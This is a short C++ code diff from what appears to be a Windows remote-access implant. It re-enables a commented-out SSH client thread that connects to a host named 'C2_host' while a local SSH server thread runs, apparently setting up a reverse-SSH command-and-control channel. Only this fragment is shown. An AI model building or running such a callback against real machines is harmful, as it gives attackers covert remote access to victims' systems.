@@ -97,12 +97,12 @@ int main(int argc, char** argv){
     std::thread server_thread(server.run, ssh_server_port_int);
 
     // Client
-    /*auto client = SSHClient();
-    std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);*/
+    auto client = SSHClient();
+    std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);
 
     server_thread.detach();
     Sleep(1000);
-    //client_thread.detach();
+    client_thread.detach();
 
     while (true)
     {
@@ -110,9 +110,7 @@ int main(int argc, char** argv){
     }
 
     server_thread.join();
-    //client_thread.join();
-
-    
+    client_thread.join();
 
 	ssh_finalize();
 
